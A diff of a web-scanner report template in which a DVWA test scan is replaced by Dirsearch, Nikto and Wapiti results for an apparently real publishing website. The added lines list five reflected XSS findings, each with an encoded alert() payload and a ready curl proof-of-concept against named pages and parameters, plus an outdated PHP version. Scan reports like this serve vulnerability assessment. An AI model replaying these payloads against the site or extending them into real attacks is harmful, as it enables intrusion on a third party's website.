@@ -1,22 +1,21 @@
 %rebase('baseScanner.tpl')
 <h2>Dirsearch's results</h2> 
-http://localhost:80/DVWA/vulnerabilities/xss_d/source
-  </br>http://localhost:80/DVWA/vulnerabilities/xss_d/help
-  </br>http://localhost:80/DVWA/vulnerabilities/xss_d/index.php
+http://www.serious-publishing.fr:80/index.php
   </br><h2>Nikto's results</h2> 
 - Nikto v2.1.6/2.1.5
-  </br>+ Target Host: localhost
+  </br>+ Target Host: www.serious-publishing.fr
   </br>+ Target Port: 80
   </br>+ GET Cookie PHPSESSID created without the httponly flag
+  </br>+ GET Retrieved x-powered-by header: PHP/4.4.9
   </br>+ GET The anti-clickjacking X-Frame-Options header is not present.
   </br>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
   </br>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-  </br>+ OPTIONS Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+  </br>+ QETAYEBQ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
   </br><h2>Wapiti's results</h2> 
 ********************************************************************************
   </br>                     Wapiti 3.0.3 - wapiti.sourceforge.io
-  </br>   Rapport pour http://localhost/DVWA/vulnerabilities/xss_d/?default=French
-  </br>                Date du scan : Sun, 13 Dec 2020 13:59:23 +0000
+  </br>                Rapport pour http://www.serious-publishing.fr/
+  </br>                Date du scan : Sat, 19 Dec 2020 12:23:03 +0000
   </br>                          Portée de ce scan : folder
   </br>********************************************************************************
   </br>
@@ -25,7 +24,7 @@ http://localhost:80/DVWA/vulnerabilities/xss_d/source
   </br>                                                            Injection SQL :   0
   </br>                                                 Injection SQL en aveugle :   0
   </br>                                                   Divulgation de fichier :   0
-  </br>                                                     Cross Site Scripting :   0
+  </br>                                                     Cross Site Scripting :   5
   </br>                                                           Injection CRLF :   0
   </br>                                                   Exécution de commandes :   0
   </br>                                                Contournement de htaccess :   0
@@ -36,12 +35,60 @@ http://localhost:80/DVWA/vulnerabilities/xss_d/source
   </br>                                                                      XXE :   0
   </br>********************************************************************************
   </br>
+  </br>Cross Site Scripting
+  </br>--------------------
+  </br>Faille XSS trouvée via l'injection dans le paramètre idarticle
+  </br>Evil request:
+  </br>    GET /photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwfuhd9i6k9%2F%29%3E HTTP/1.1
+  </br>    Host: www.serious-publishing.fr
+  </br>PoC en commande cURL : "curl "http://www.serious-publishing.fr/photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwfuhd9i6k9%2F%29%3E""
+  </br>
+  </br>                                  *   *   *
+  </br>
+  </br>Faille XSS trouvée via l'injection dans le paramètre idarticle
+  </br>Evil request:
+  </br>    GET /photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwqka0zk3m8%2F%29%3E&limit= HTTP/1.1
+  </br>    Host: www.serious-publishing.fr
+  </br>PoC en commande cURL : "curl "http://www.serious-publishing.fr/photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwqka0zk3m8%2F%29%3E&limit=""
+  </br>
+  </br>                                  *   *   *
+  </br>
+  </br>Faille XSS trouvée via l'injection dans le paramètre idarticle
+  </br>Evil request:
+  </br>    GET /photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwtkwrbd8qb%2F%29%3E&limit=1 HTTP/1.1
+  </br>    Host: www.serious-publishing.fr
+  </br>PoC en commande cURL : "curl "http://www.serious-publishing.fr/photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwtkwrbd8qb%2F%29%3E&limit=1""
+  </br>
+  </br>                                  *   *   *
+  </br>
+  </br>Faille XSS trouvée via l'injection dans le paramètre idarticle
+  </br>Evil request:
+  </br>    GET /photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fw1804hk3o3%2F%29%3E&limit=2 HTTP/1.1
+  </br>    Host: www.serious-publishing.fr
+  </br>PoC en commande cURL : "curl "http://www.serious-publishing.fr/photospresse.php?idarticle=%22%3E%3C%2Fa%3E%3CSvG%2FoNloAd%3Dalert%28%2Fw1804hk3o3%2F%29%3E&limit=2""
+  </br>
+  </br>                                  *   *   *
+  </br>
+  </br>Faille XSS trouvée via l'injection dans le paramètre prixTotal
+  </br>Evil request:
+  </br>    POST /commande.php HTTP/1.1
+  </br>    Host: www.serious-publishing.fr
+  </br>    Referer: http://www.serious-publishing.fr/commande.php
+  </br>    Content-Type: application/x-www-form-urlencoded
+  </br>
+  </br>    prixTotal=%22%2F%3E%3CScRiPt%3Ealert%28%2Fwja785pe7g%2F%29%3C%2FsCrIpT%3E&page=NEXT
+  </br>PoC en commande cURL : "curl "http://www.serious-publishing.fr/commande.php" -e "http://www.serious-publishing.fr/commande.php" -d "prixTotal=%22%2F%3E%3CScRiPt%3Ealert%28%2Fwja785pe7g%2F%29%3C%2FsCrIpT%3E&page=NEXT""
+  </br>
+  </br>                                  *   *   *
+  </br>
+  </br>********************************************************************************
+  </br>
   </br>Résumé des anomalies :
   </br>----------------------
   </br>                                                Erreur interne au serveur :   0
   </br>                                       Consommation anormale de ressource :   0
   </br>********************************************************************************
-  </br>
+  </br><div class="d-grid gap-2 d-md-block"><a download href="/scanner"><button class="btn btn-primary" type="button">Download Report</button></a></div>
   </div> 
  </body> 
 </html>
